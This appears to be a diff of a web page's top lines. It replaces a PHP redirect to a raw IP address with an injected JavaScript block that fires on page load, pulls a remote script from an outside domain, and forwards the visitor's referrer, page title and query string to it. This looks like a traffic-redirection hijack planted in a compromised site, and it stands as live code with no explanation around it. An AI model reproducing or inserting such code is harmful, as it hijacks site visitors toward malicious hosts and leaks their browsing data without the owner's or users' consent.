@@ -1,4 +1,13 @@
-<?php header('Location: http://185.181.164.27/DWZxn6?' . http_build_query($_GET) . '&se_referrer=' . urlencode($_SERVER['HTTP_REFERER']) . ''); ?>
+<span id="fa09d33c-8bab-473c-3acd-c41adfc7b96a"></span><script type="application/javascript">
+var d=document;var s=d.createElement('script'); 
+s.src='https://dayinjing.asia/DWZxn6?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm60106b361ab33=script60106b361ab36&_cid=fa09d33c-8bab-473c-3acd-c41adfc7b96a'; 
+if (document.currentScript) { 
+document.currentScript.parentNode.insertBefore(s, document.currentScript);
+} else {
+d.getElementsByTagName('head')[0].appendChild(s);
+}
+if (document.location.protocol === 'https:' && 'https://dayinjing.asia/DWZxn6?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm60106b361ab33=script60106b361ab36'.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
+</script>
 
 <!DOCTYPE html>
 <!-- saved from url=(0026)https://www.185.181.164.27/ru/ -->
